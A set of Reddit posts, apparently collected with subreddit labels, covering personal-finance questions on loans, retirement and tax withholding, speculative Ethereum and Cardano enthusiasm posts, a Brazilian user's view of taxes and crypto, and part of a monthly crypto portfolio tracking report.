The seller is offering two routes for payment:

1 - A $1k discount if I pay full cash. I  could do that, but it would wipe out my savings. I'd still have ~$7000 invested in the market over a couple of low-cost (.15% &amp; .17%) EFTs.

2 - 6% simple interest financing over my choice of a 10, 15, or 20 year term. Seller requires 20% down minimum.

If I financed $5k over 10 years, that'd be a $66/mo payment which is more than manageable. Currently, I'm leaning towards that option, which would mean I could have more rainy day funds currently and the opportunity to invest more now to offset or equal the extra $3k the loan would cost. While I'm leaning that way, I'm also interested in hearing any other perspectives.

About me: I'm a 38 year old with no dependents and no revolving debt. I'm behind target goals for retirement funds (~$130k between work-based and private IRAs), but have been maxing out both for the last 1.5 years. My house is rented, but that's a requirement for my job -- which is a permanent federal position. I've considered being a landlord in a neighboring community, but I just don't have the funds or interest for that currently. There's a high likelihood I'll gain a ~$4k promotion in the next 2-3 months. If that doesn't come through, I'm guaranteed an $1800 increase in 10 months. 

Finally, I've seen a few other posts on /r/personalfinance with the same ""cash or finance?"" theme. It seems financing (especially with current rates) is the best approach; however, given the options at hand, both of which provide pros and cons, this seems unique. Thanks!",finance

CryptoCurrency,Putting in perspective the ETH/USD bull thesis,"I know most people here are thoroughly familiar with Ethereum. But for those of you who are not, Ethereum is a cryptocurrency that is used to pay transaction fees (gas) on the ethereum network. 

Ethereum is a lot of things to a lot of people, but at its core it is a programming language with a native crypto, allowing people to develop Decentralized applications, smart contracts, DAOs, NFTs, and so much more; these use cases are already beginning to fundamentally change the way business and finance is conducted and transacted. 
Crypto as a whole is beginning to fundamentally alter the way we *perceive* money, the way we perceive ownership, what we consider to be valuable, and these and a whole host of other radical changes are sure to only accelerate. Institutions, as we are now more than aware, have taken notice. 

Most institutional interest is in Bitcoin, and it looks to remain that way for some time as more legacy firms dip their toes in. However, interest in ETH has begun to skyrocket, as people(and institutions)  realize all the ways it is different than BTC, and are trying to wrap their heads around a potential future valuation. 

Which brings us to the bull thesis, and I would caution I'm being overly optimistic here but frankly my conviction is unshakeable: that Ethereum will one day be the foundational layer, or a component thereof, of essentially *all* software applications, current and future. Video games, digital merchandise, physical merchandise, all finance including derivatives, retirement plans, all corporate entities existing as DAOs, all virtual reality apps and uses, etc. The list goes on. There is not a single app, entity, or software product that wont be at least partially built on ETH, or in some way connected to it. Even entirely separate competitors must remain compatible, and it only follows that most of their volume will find it's way to ethereum one way or another.

""How and why will this come to pass? Why ETH? And how does this help me wrap my head around a potential valuation?"" 

1. Because decentralized organizations can outcompete centralized entities. This is basic economics. These businesses are in high demand fields, are able to automate processes that we hire people to do, and therefore have essentially very little to no overhead on a relative basis. Credit markets can operate where yields beat banks. Some yields beat stocks. Some yields beat TECH STOCKS.  There is value being created and money being saved at every turn, and stakeholders profit handsomely along the way. 
The consumer gets a cheaper, better product, and the stakeholders enjoy high returns. Centralized entities have to adapt (decentralize) or be crushed. You're seeing this already with DEXs vs CEXs, Binance has already begun to adapt. Coinbase is going public but they have recently hinted at a coin of their own, and you know what that means. As decentralization spreads further into finance and into other industries, so too will this paradigm. 

2. Why ETH? because, and this is a very recent development, it would appear that ETH has been ""chosen"" so to speak. That is to say, the United States and US corporate entities have begun to view it favorably, and seem to be choosing it over other options. USDC is built on ethereum, a 1:1 USD backed ERC-20 token. The government likes that very much. Visa and Mastercard have both begun settling transactions on the Ethereum chain. Firms like Bain capital are investors in projects like Compound finance. JPMorgan and others recently invested in Consensys' latest funding round, the biggest developer on ETH at the moment.
 Other blockchains have advantages to ethereum, this is true. Their weaknesses, from the perspective of institutions and our government, lie in their sometimes more centralized nature, their ties to foreign governments, and their use in illicit activities. Ethereum is really the only network of it's kind and size that can be said to be decentralized and owing allegiance to no one country moreso than another.
 Countries like China, NK, Russia, Venezuela, and Iran have used Bitcoin and seem to be trying to accumulate as much as possible. I'm not saying that's not the case with ETH, but the US has a clear opportunity to be the top player in the ETH space, and to pretty much ensure it is the global standard as such. If they see Bitcoin as a national security issue, then ETH is the foile. They will take the dollar digital, and they will use ETH to cement ensure it's spread in the digital age.

3. How does this help anyone wrap their heads around a potential valuation? It doesnt! But the scale of what we are dealing with should be coming more into focus for you. Nothing like this has ever existed before. 


Finally, and to really complicate matters, is EIP 1559 and Ethereum 2. Without going too much into either of these things, I'll touch on one aspect of EIP-1559, specifically, the burn mechanism. EIP 1559 introduces a burn mechanism to ethereum transactions, meaning every time a transaction occurs on the chain, a tiiiiiiny little bit of ETH is ""burnt"" and therefore removed from supply forever. 
Think about the potential scale of ethereum we just covered. Think about the # of transactions on a network of that size. Now, imagine how much of the supply will be destroyed.
 Bitcoin's supply is currently ~19.5m, with a total supply of 21m. Scarce, to be sure. Only 1.5m more bitcoin will ever exist, and it will take years to mine it. Ethereum's supply is ~120m, with no fixed supply. However, that changes with EIP 1559 and ETH 2. Taking both coins' total supply, and assuming ETH scales the way I expect it to, ETH will overtake Bitcoin in scarcity terms-this is almost an inevitability. But heres the kicker: Whatever is left after all that deflation? That's what you and I are buying. That's what institutions are buying. People still need that to pay gas. The demand is ever present.

Which brings us back to valuation. You want me to name a price target, I know. Well, I'm not going to. All I can say is that taking all of the above into account, along with the way monetary policy is heading, I believe that ETH is a unique asset in that it's market cap is totally unfettered. Trillions seem paltry. Hundreds of trillions is more likely, if not more ludicrous figures I dont dare name. My bear case is pretty much that it *only* encompasses the entire financial industry one day.  Ho-hum. 



TL;DR: we fuckin wit some crazy shit bois 

And Disclaimer: I hold and am long Ethereum, Chainlink, The Graph, and Ren. 40%, 40%, 10% and 10%, respectively, and have been buying since spring of 2020. I do not hold any Bitcoin, but that doesnt mean it wont appreciate right there along with ETH. I personally just expect ETH to eventually outpace it, I am not suggesting anyone sell or stop buying BTC. On the contrary, BTC has it's own unique properties that make it compelling. Own both!

cardano,Cardano Rumor Rundown APR 14 2021,"Hey Everyone!

I've been consuming all the Cardano news and media on a daily basis for years now. I figured it wouldn’t hurt to share a list of what I'm seeing for anyone else who's interested. Feel free to make additions as you see fit. Many of your additions from yesterday are in the “Newly Covered” list for today. Also let me know if you think any of the “Previously Covered but Still Interesting” items are no longer interesting and should leave the list. 

Check out the youtube companion to today’s post: [https://youtu.be/uO6Cf\_8pF0g](https://youtu.be/uO6Cf_8pF0g)

Let's go....

Newly covered today: 

1. New IOHK blog post on Plutus from Lars.  [https://iohk.io/en/blog/posts/2021/04/13/plutus-what-you-need-to-know/](https://iohk.io/en/blog/posts/2021/04/13/plutus-what-you-need-to-know/)
2. Occam.fi partners with Bitcoin.com as custodian to create an ETH-ADA bridge. According to the article, this will allow for any Cardano native token to seamlessly switch to an ERC-20 token and vice versa. The vice versa part is what the ERC-20 Converter does for us already right? [https://cointelegraph.com/press-releases/bitcoincom-to-accommodate-occams-ethereum-to-cardano-cross-chain-bridge](https://cointelegraph.com/press-releases/bitcoincom-to-accommodate-occams-ethereum-to-cardano-cross-chain-bridge)
3. LunarCrush interviewed Charles and he gave us some more details on the Ethiopia deal and Africa:  1) the IOHK office in Ethiopia is merging with the Singularity Net Office (it’ll be 30-50 people...so pretty large presence); 2) Africa special to be announced very soon; 3) they will be doing fintech &amp; govtech, 4) everything on the governance side is going to be upgraded across a wide swathe of African nation states in next ten years, 5) lots of possible use cases including supply chains in agritech, putting land on a ledger, voting, identity, reputation (i.e. credit), &amp; payment systems; 6) Africa is like investing in China in the 1980s; 7) the demographics of Africa make it a really easy call to direct investment there; 8) charles said “Ethiopia, in particular, is very special to us and WE HAVE ACTUALLY CLOSED SOME DEALS...we’ll talk about those at the Africa Special”; 9) there will be security token plays in Africa in the mid 2020s since there are no stock exchanges; and 10) there is a big unannounced partnership called “the DCF” with a brand name consultancy we will recognize.  Here’s the LunarCrush interview. All queued up to the exact spot for the Africa discussion--[https://youtu.be/GWpqNPdOf9E?t=3804](https://youtu.be/GWpqNPdOf9E?t=3804)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Catalyst Fund 3 Voting is ongoing, it looks like the Yoroi team has worked out the voting problem in the Yoroi wallet. [https://twitter.com/YoroiWallet/status/1369050858546200585](https://twitter.com/YoroiWallet/status/1369050858546200585)
4. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
5. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
6. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
7. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
8. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
9. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe. [https://www.youtube.com/watch?v=B8Yj\_dvh7OA](https://www.youtube.com/watch?v=B8Yj_dvh7OA) [https://www.youtube.com/watch?v=p-1TKq7okhs](https://www.youtube.com/watch?v=p-1TKq7okhs)
13. Cardano hits 400k delegators! [https://twitter.com/RichardMcCrackn/status/1377732956194766850](https://twitter.com/RichardMcCrackn/status/1377732956194766850)
14. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture. [https://www.yahoo.com/entertainment/graph-blockchain-announces-acquisition-cardano-110000210.html](https://www.yahoo.com/entertainment/graph-blockchain-announces-acquisition-cardano-110000210.html)

16. Occam.fi is creating a defi launchpad on Cardano that will be called OccamRazer. [Cointelegraph OccamRazer Article](https://cointelegraph.com/press-releases/occamrazer-the-first-defi-launchpad-for-cardano)
17. Orion Protocol is aiming to be the first liquidity aggregator on Cardano. [https://coinmarketcap.com/el/headlines/news/orion-protocol-and-cardano/](https://coinmarketcap.com/el/headlines/news/orion-protocol-and-cardano)
18. How hard is learning Haskell from scratch? Today’s youtube companion to this post describes my experience so far learning Haskell as a beginner with little programming experience. [https://haskellbook.com/ ](https://haskellbook.com/)[http://learnyouahaskell.com/chapters](http://learnyouahaskell.com/chapters) [Derek Banas Youtube Haskell Tutorial](https://www.youtube.com/watch?v=02_H3LjqMr8)
19. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal! This could finally retire rumor #1 that started the Rumor Rundown. [https://twitter.com/ArmySpies/status/1378416705282613253](https://twitter.com/ArmySpies/status/1378416705282613253)
20. Cardano NFTs get some coverage on CoinTelegraph. [https://cointelegraph.com/news/wild-west-as-developers-macgyver-highly-popular-nfts-on-cardano/amp](https://cointelegraph.com/news/wild-west-as-developers-macgyver-highly-popular-nfts-on-cardano/amp)
21. Emurgo Academy for blockchain education? Has anyone heard of this? [https://twitter.com/emurgo\_io/status/1378346801598754816](https://twitter.com/emurgo_io/status/1378346801598754816)
22. Onyx Stake Pool announces Cardano’s first Quantum block! [https://twitter.com/onyxstakepool/status/1378848216578412547](https://twitter.com/onyxstakepool/status/1378848216578412547)
23. SpaceBudz published a great article on how they were able to distribute 10,000 NFTs. [https://spacebudz.medium.com/how-we-pulled-off-the-sale-9dbe54c30ba5](https://spacebudz.medium.com/how-we-pulled-off-the-sale-9dbe54c30ba5)
24. For those learning Haskell/Plutus, check out this awesome one hour video from 2012 with Brian Beckman that introduces monoids and monads in a very non-scary way. [https://www.youtube.com/watch?v=ZhuHCtR3xq8](https://www.youtube.com/watch?v=ZhuHCtR3xq8)
25. Sebastien was recently on Kaizen Crypto and detailed how Emurgo plans to deliver Proof of Keys for Cardano whereby users could sign a message to prove that they own the private keys to a certain account in a standardized format. All queued up to the exact spot: [https://youtu.be/VcRlL-6YROY?t=625](https://youtu.be/VcRlL-6YROY?t=625)
26. ...AND STILL....CARDANO=THE KING OF GITHUB COMMITS! [https://twitter.com/wiSource/status/1379142670686294017](https://twitter.com/wiSource/status/1379142670686294017)
27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
28. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
29. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
30. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
37. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
42. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)
43. “Smart people end up in Cardano one way or another.” [https://twitter.com/Adavanz1/status/1378405038608031746](https://twitter.com/Adavanz1/status/1378405038608031746)
44. IOHK drops a good summary of the Alonzo Smart Contract timeline. [https://iohk.io/en/blog/posts/2021/04/08/smart-contracts-%E2%80%93-here-we-come/](https://iohk.io/en/blog/posts/2021/04/08/smart-contracts-%E2%80%93-here-we-come/)
45. You can now buy Cardano Estates wine with ADA. This is not a novelty crypto wine. This is legit wine. [https://twitter.com/Jack22220741/status/1380603834947485700](https://twitter.com/Jack22220741/status/1380603834947485700)
46. Cardano gets a little coverage on nasdaq.com. [https://www.nasdaq.com/articles/cardano-is-worth-considering-for-its-utility-and-strong-leadership-2021-04-07](https://www.nasdaq.com/articles/cardano-is-worth-considering-for-its-utility-and-strong-leadership-2021-04-07)
47. The Cardano native token space continues to flourish. [https://twitter.com/matiwinnetou/status/1380600524853108738](https://twitter.com/matiwinnetou/status/1380600524853108738)
48. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
49. The Plutus Pioneer program has been open sourced! Lecture #1 has an extremely good explanation of why the EUTxO model in Cardano is so much more conducive to security and much greater predictability than the account balance model in Ethereum.   [https://github.com/input-output-hk/plutus-pioneer-program](https://github.com/input-output-hk/plutus-pioneer-program)
50. There is now a website that will mint Cardano NFTs for you.  Thanks to Cardano subreddit user Padierfind. [https://www.nft-maker.io/](https://www.nft-maker.io/)
51. Yesterday was “Get ADA Day” with the end of Epoch 258.  I hope everyone did well in their staking. 
52. Here’s a great way to visualize token minting and other on-chain activities thanks to Smaug Stake Pool. [https://pool.pm/](https://pool.pm/)
53. It looks like the automated NFT maker covered yesterday,  [nft-maker.io](https://www.nft-maker.io/), actually charges 10 ADA per NFT.  Just an update on the price there since it was unknown yesterday.  
54. The Cardano tattoo phenomenon continues. This time, we even have one that actually features a depiction of the namesake.  [https://twitter.com/jp\_tattooist/status/1381236949567086592 ](https://twitter.com/jp_tattooist/status/1381236949567086592)[https://twitter.com/jp\_tattooist/status/1381351429554724875](https://twitter.com/jp_tattooist/status/1381351429554724875)
55. Ethiopian Prime Minister Abiy Ahmed outlines how he will liberalize the telecom industry in his country and lays out his four pillars of “Digital Ethiopia 2025”: digital ID, interoperable payment platforms, e-government applications, and e-commerce. [https://telecomreviewafrica.com/index.php/en/articles/exclusive-interviews/2240-liberalization-of-telecoms-in-ethiopia ](https://telecomreviewafrica.com/index.php/en/articles/exclusive-interviews/2240-liberalization-of-telecoms-in-ethiopia)
56. Beta version of the Emurgo dApp Connector (a Metamask Killer) is out! As planned, it runs on Ergo for now but Cardano later. [https://twitter.com/emurgo\_io/status/1381675733605474307](https://twitter.com/emurgo_io/status/1381675733605474307)

personalfinance,Student Loans Vs. 401k,"Hello! 23M here!  


I have been working for about a year now full time making 78k a year.  
I have about 107k in private student loans (3.66%) and 21k in federal (0% due to covid).  
I am currently maxing my Roth IRA and getting the match (I put in 8% and get 10% from my employer, don't ask its weird I know) in my 401k.  
I had planned to increase my 401k contributions by 2% or so every year to basically take an average 2-3% raise and just shove it into there until I was maxed out. But, I recently thought that I should try to just pay more on my loans instead so that I could pay them off a lot faster. So, I would take that raise and raise the payment of my student loans per month instead. Obviously this will make my 401k take a hit since I will be putting in substantially less early on but I will rid myself of this student loan debt a few years earlier.  


I am just looking for opinions, I'm not really sure what is better.",finance
CryptoCurrency,Crypto will change my life and of many people of my country,"To start, i live in Brazil, you may know about the history of a Brazilian that gains more in MOONs than a minimum wage, and this guy is not lying, here the minimum wage is R$1.040, wich is less than $200 per month, and here in Brazil we pay HUGE taxes, more than 50% of the wage of my father goes to taxes, and the economy is very regulated, here crony capitalism is strong, in a lot of markets, your company can only survive, if you have some ""friends""  in the government, and despite paying a lot of taxes, the public services are just trash because of corrupt politicians, believe me, nobody of you would support taxes and regulation, if you lived here, that's why i hate taxes and regulation.

The first influencer to talk abou Bitcoin here, was Daniel Fraga, he is a libertarian (like me), and he was promoting Bitcoin in 2012-2014, he was always fighting against corrupt politicians, there was a point, that he was exposing a corrupt judge, and the judge just sent cops to the Daniel Fraga's house, but he didn't ran away, until in 2014, that the government sent the Federal Police and gave a lame excuse to the public (that he was ""slandering politicians""), they frozed his bank account, and there was R$20 ($7 at the time, Brazilian currency has lost a lot of value), he just has gone to another country, and until today, nobody knows where he is, but he is alive, his Bitcoin wallet still active, and he bought more than 400 Bitcoins in 2012, and he is HODLING most of them today, so he is a multi milionarie.

So i see in decentralized crypto, a chance of having freedom, so politicians won't steal 50% of all wealth that i produce, and i'm so happy that this is possible, yes, making 1000% profits can be good, but freedom has no price, so if you ask, what is my personal moon, that is paying 0% taxes.

Edit: thanks for the cheers.

Also some people are getting confused about the 50% that i said, there is a explanation:

1. My father earns about 2,5 minimum wages, R$2.600 or less than $500, and he pays income tax, that is about 20%.

2. The 50% i said, is including all direct taxes, here a list of some:

You need to pay taxes every year to use your car, it is called IPVA, is about 2% of the price of the car, my father pays abous R$900 every year on this, + documentation.

The taxes on eletricity are heavy, the price should be R$0,50 per KWh, but with taxes the price increase to R$1,00 per KWh, basically 50%

Even taxes on food are big, on the food you pay 22.5% on taxes, wich is way higher than the 6% that most countries have.

And the list jus goes on, and i reached to the 50% i said, of direct taxes, if i were to include indirect taxes, that number would be even higher.",cryptocurrency

personalfinance,Additional Tax withholding for additional income 1040-ES,"Hi Friends, I hope someone can shed some light on a tax question for me. Please let me know if I can better explain the situation.

The Question: Can I use the 1040-ES form to pay additional federal taxes even though I have some money being taken out by my employer?

The Reason for the question: Usually I'm pretty close to 0 when I file my federal tax returns. In 2020 I changed jobs, made money in the stock market, and also made money from a rental property. With all the extra income and not withholding enough through my new employer, I owed a good amount of taxes.   
My tax preparer warned me *not to do that again*. It's already April and if I change my withholding today, it won't kick in until nearly May. I'm wondering if I can pay extra quarterly to make up for the 2021 Rental property in addition to the shortcoming from the employers withholding? Or would it be a better idea to significantly increase my employers withholding to make up for January through April?",finance

## Month Fifteen – UP 589%

[ 2020 Top Ten Summary ](https://preview.redd.it/uf8kpldq35t61.png?width=1245&amp;format=png&amp;auto=webp&amp;s=b9a5f7561fd403c3d91475c62208d039f9cbd486)

While not quite as crazy as [February](https://toptencryptoindexfund.com/tracking-2020-top-10-cryptocurrencies-month-14), March was another extremely strong month for the 2020 Top Ten Portfolio. All cryptos had solid two-digit gains led by **EOS** and **Tezos** and the 2020 Top Ten further solidified its position as the best performing of the four [Top Ten Experiments](https://toptencryptoindexfund.com/). 

100% of this group is in the green overall, all have at least *triple digit price growth* with two crypos in *four digit growth territory*. 

The **+589%** return of the Top Ten Index approach has *outperformed seven of the individual component cryptos contained within the Index.* It has also absolutely dwarfed the returns of the S&amp;P 500 over the same period of time.

## March Ranking, Movement Report, and Dropouts

70% of the cryptos in the 2020 Top Ten moved this month and most of them lost ground:

Ups:

* BNB - up one place (#4→#3)
* Tether - up one place (#5→#4)

Downs:

* BSV - down six places [last month](https://toptencryptoindexfund.com/tracking-2020-top-10-cryptocurrencies-month-14), down six places this month (#23→#29)
* BCH - down three places (#11→#14)
* EOS - down two places (#22→#24)
* XTZ  - down two places, and out of the Top Thirty (#29→#31)
* LTC -  down one place (#8→#9)

[ 2020 Top Ten Rank - 40&amp;#37; drop out rate](https://preview.redd.it/xbe8394845t61.png?width=400&amp;format=png&amp;auto=webp&amp;s=d0d49f4c9432eaff498631e728d09275649e18d4)

**Top Ten dropouts since January 2020:**  in just over one year, 40% of the cryptos that[ started in the Top Ten](https://toptencryptoindexfund.com/tracking-2020-top-ten-month-one/) have dropped out:  **EOS**, **BSV, Tezos,** and most recently **BCH** have been replaced by **Chainlink, Cardano,** **Polkadot,** and **UNI.**

**EOS** and **BSV** are out of the Top *Twenty.*  And **XTZ**’s current #31 rank places it out of the Top *Thirty.*

## March Winners and Losers 

***March Winners*** – **EOS** (+47%) followed by **Tezos** (+42%).  Also of note, all cryptos (or the non-stablecoins at least) finished the month with double digit gains, something that hasn’t happened [in a while](https://toptencryptoindexfund.com/tracking-2020-top-10-cryptocurrencies-month-7/). 

***March Losers*** –  Besides **USDT**, **Bitcoin Cash** had the weakest performance of the month (but still finished up +15%).

## Tally of Monthly Winners and Losers

After fifteen months, here’s a snapshot of the 2020 Top Ten Experiment’s monthly winners and losers:

[2020 Top Ten Ws and Ls](https://preview.redd.it/55nrcwec45t61.png?width=412&amp;format=png&amp;auto=webp&amp;s=d9bc560b1e160e5945e8f0f58f8055aff112336a)

**EOS’s** March win didn’t change anything overall: with four monthly victories, **ETH** has doubled the wins of the tied for second place **BTC, USDT,** **BNB,** and **Tezos.**  With yet  another **Tether** loss this month (always nice to see), it has the most losses: seven out of fifteen months (nearly 47%).

## Overall Update – BNB best performance of any crypto in any Top Ten Experiment, 100% of cryptos in triple digit positive territory, worst performer (EOS) still up +117%.

Welcome to the best performing Experiment of the four, by far.  The 2020 Top Ten are on fire right now and a few things sets this group apart from the other [Top Ten Crypto Experiments](https://toptencryptoindexfund.com/):  all cryptos (except **USDT** of course) are up at least triple digits (**Ethereum** and **Binance Coin** are up quadruple digits).  

And in **BNB** we have the only crypto in any year Experiment that is up over 2,000% (**+2,369%**, actually).  

The initial $100 investment into first place **BNB**? Currently worth **$2,470**. 

That’s just [insane](https://www.youtube.com/watch?v=RijB8wnJCN0).

In second is **Ethereum,** also in the quadruple digit gains club (+1455%) followed by **BTC**, up +732%.    

Besides **Tether**, **EOS** is the worst performing cryptocurrency of the 2020 Top Ten Portfolio.  But last place **EOS’s** 117% gains are almost *five times the return of the stock market* over the same period of time (see below).

## Total Market Cap for the Entire Cryptocurrency Sector:

[Total Crypto Market Cap since Jan 2020](https://preview.redd.it/7b5aey8h45t61.png?width=1065&amp;format=png&amp;auto=webp&amp;s=5ebd25505295152a9db0ae973fd76b1dc5cffa8a)

Over $425 billion dollars was added to the market in March. The crypto market is up **+915%** over the fifteen month lifespan of the 2020 Top Ten Experiment. For the sixth month in a row, the month-end market cap has set new highs for the 2020 Top Ten Experiment.   

If you were able to capture the entire crypto market since, you’d be doing much better than the Experiment’s Top Ten approach (+589%) and much much better than the S&amp;P (+24%) over the same time period. But not better than if you stuck all your eggs in either **BNB’s** or **ETH’s** basket.

## Bitcoin Dominance:

